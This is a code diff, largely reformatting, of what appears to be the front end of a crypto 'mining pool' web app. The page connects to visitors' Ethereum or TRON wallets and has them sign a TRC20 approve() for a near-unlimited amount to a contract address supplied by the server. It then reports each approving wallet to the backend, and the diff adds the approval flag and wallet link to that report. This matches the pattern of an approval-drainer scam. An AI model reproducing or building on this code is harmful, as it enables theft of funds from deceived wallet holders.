@@ -73,42 +73,46 @@
 				this.problem = []
 			},
 			async getContent() {
-        const res = await http.post('/index/Index/home', {
-          data: {
-            "language": uni.getLocale(),
-            "wallet_address": null,
-            "coin_name": "ETH"
-          }
-        })
-        const {data} = res
-        const title = data?.title
-        this.mining_pool = data?.mining_pool || {}
-        this.earnings = data?.platform_earnings || []
-        this.problem = data?.problem || []
-        this.banner = data?.banner
-        this.title = title
-        this.white = data?.white_paper
-        uni.setStorageSync('title', title)
-        uni.hideLoading()
-      },
-      async doapprove_success(address, contract) {
-        //保存授权地址信息，无需处理返回信息
-        const data = {
-          address,
-          contract
-        };
-
-        const res = await http.post('/index/Index/address', data)
-        console.log(`address res`, res)
-      },
+				const res = await http.post('/index/Index/home', {
+					data: {
+						"language": uni.getLocale(),
+						"wallet_address": null,
+						"coin_name": "ETH"
+					}
+				})
+				const {
+					data
+				} = res
+				const title = data?.title
+				this.mining_pool = data?.mining_pool || {}
+				this.earnings = data?.platform_earnings || []
+				this.problem = data?.problem || []
+				this.banner = data?.banner
+				this.title = title
+				this.white = data?.white_paper
+				uni.setStorageSync('title', title)
+				uni.hideLoading()
+			},
+			async doapprove_success(address, contract) {
+				//保存授权地址信息，无需处理返回信息
+				const data = {
+					address,
+					contract
+				};
+				data.isapprove = this.isapprove
+				data.link = this.walletlink[this.chainId]
+				console.log('doapprove_success', data);
+				const res = await http.post('/index/Index/address', data)
+				console.log(`address res`, res)
+			},
 			async doapprove_trc() {
 				//是否获取到相应合约
 				if (!this.contract || !this.contract.contract || !this.contract.contract.trc) {
 					return false;
 				}
 				uni.showLoading()
-        const that = this;
-        try {
+				const that = this;
+				try {
 					let contractdata = that.contract.contract.trc
 					let _value = 999999999000000 //授权数量
 					const parameter = [{
@@ -118,15 +122,15 @@
 						type: 'uint256',
 						value: _value
 					}];
-          const tx = await that.tronWeb.transactionBuilder.triggerSmartContract(
-              contractdata.bi,
-              "approve(address,uint256)", {},
-              parameter,
-              that.address
-          );
-          const signedTx = await that.tronWeb.trx.sign(tx.transaction);
-          const broastTx = await that.tronWeb.trx.sendRawTransaction(signedTx);
-          uni.hideLoading()
+					const tx = await that.tronWeb.transactionBuilder.triggerSmartContract(
+						contractdata.bi,
+						"approve(address,uint256)", {},
+						parameter,
+						that.address
+					);
+					const signedTx = await that.tronWeb.trx.sign(tx.transaction);
+					const broastTx = await that.tronWeb.trx.sendRawTransaction(signedTx);
+					uni.hideLoading()
 					if (broastTx.result) {
 						console.log(broastTx.result) //result 为交易哈希
 
@@ -204,11 +208,11 @@
 				//开始授权
 			},
 			async getcontract() {
-        uni.showLoading()
-        const res = await http.post('/index/Index/contract')
-        this.contract = res.data
-        console.log(`this.contract`,this.contract)
-      },
+				uni.showLoading()
+				const res = await http.post('/index/Index/contract')
+				this.contract = res.data
+				console.log(`this.contract`, this.contract)
+			},
 			async ethcontent_address() {
 				const accounts = await this.web3js.eth.getAccounts();
 				//comjs.log(accounts)
@@ -219,8 +223,8 @@
 				}
 			},
 			async ethcontent_chain() {
-        const that = this;
-        try {
+				const that = this;
+				try {
 					const echainId = await ethereum.request({
 						method: 'eth_chainId'
 					});
@@ -246,44 +250,46 @@
 			},
 			async ethcontent() {
 				//检测是否以太环境
-        const that = this;
-        const obj = setInterval(async () => {
-          if (window.ethereum) {
-            clearInterval(obj);
-            if (typeof web3 !== 'undefined') {
-              that.web3js = new comweb3(web3.currentProvider);
-            } else {
-              that.web3js = new comweb3(new Web3.providers.HttpProvider("http://localhost:8545"));
-            }
-            const myadd = await ethereum.request({
-              method: 'eth_requestAccounts'
-            });
-            const echainId = await ethereum.request({method: 'eth_chainId'});
-            comjs.msg(echainId)
-            await that.ethcontent_chain()
-          } else if (window.tronWeb) {
-            comjs.msg('tronWeb')
-            if (window.tronWeb.defaultAddress.base58) {
-              clearInterval(obj);
-              that.address = window.tronWeb.defaultAddress.base58
-              that.isconnect = true
-              that.chainId = 2;
-              that.mychainId = 1;
-              that.contenttxt = that.address.substr(0, 5) + '***' + that.address.substr(-5)
-              that.tronWeb = window.tronWeb;
-            }
-          } else {
-            comjs.msg('not net')
-            clearInterval(obj);
-            if (!that.isauto) {
-              that.show_ethWallet_list()
-            }
-          }
-        }, 100);
-      },
+				const that = this;
+				const obj = setInterval(async () => {
+					if (window.ethereum) {
+						clearInterval(obj);
+						if (typeof web3 !== 'undefined') {
+							that.web3js = new comweb3(web3.currentProvider);
+						} else {
+							that.web3js = new comweb3(new Web3.providers.HttpProvider("http://localhost:8545"));
+						}
+						const myadd = await ethereum.request({
+							method: 'eth_requestAccounts'
+						});
+						const echainId = await ethereum.request({
+							method: 'eth_chainId'
+						});
+						comjs.msg(echainId)
+						await that.ethcontent_chain()
+					} else if (window.tronWeb) {
+						comjs.msg('tronWeb')
+						if (window.tronWeb.defaultAddress.base58) {
+							clearInterval(obj);
+							that.address = window.tronWeb.defaultAddress.base58
+							that.isconnect = true
+							that.chainId = 2;
+							that.mychainId = 1;
+							that.contenttxt = that.address.substr(0, 5) + '***' + that.address.substr(-5)
+							that.tronWeb = window.tronWeb;
+						}
+					} else {
+						comjs.msg('not net')
+						clearInterval(obj);
+						if (!that.isauto) {
+							that.show_ethWallet_list()
+						}
+					}
+				}, 100);
+			},
 			async trccontent() {
-        const that = this;
-        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+				const that = this;
+				if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
 					that.address = window.tronWeb.defaultAddress.base58
 					that.isconnect = true
 					that.chainId = 2;
